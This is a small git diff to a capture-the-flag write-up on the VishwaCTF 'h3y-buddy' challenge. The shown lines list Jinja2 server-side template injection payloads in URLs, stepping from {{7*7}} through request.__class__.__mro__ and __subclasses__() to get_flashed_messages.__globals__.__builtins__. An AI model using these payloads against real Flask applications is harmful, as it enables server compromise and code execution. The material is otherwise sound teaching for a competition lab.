@@ -130,7 +130,7 @@ https://h3y-buddy.vishwactf.com/submit?name={{7*7}}
 Now that we know it works, let's level up the payloads until we reach the flag. You can get a great reference for SSTI payloads in different template engines on [Hacktricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-read-remote-file). In this case, we used **get_flashed_messages** a built-in function on flask
 
 ```
-https://h3y-buddy.vishwactf.com/submit?name=\{\{request.__class__\}\}
+https://h3y-buddy.vishwactf.com/submit?name={{ request.__class__ }}
 https://h3y-buddy.vishwactf.com/submit?name=\{\{request.__class__.__mro__[2]\}\}
 https://h3y-buddy.vishwactf.com/submit?name=\{\{request.__class__.__mro__[2].__subclasses__()\}\}
 https://h3y-buddy.vishwactf.com/submit?name=\{\{get_flashed_messages.__globals__.__builtins__\}\}
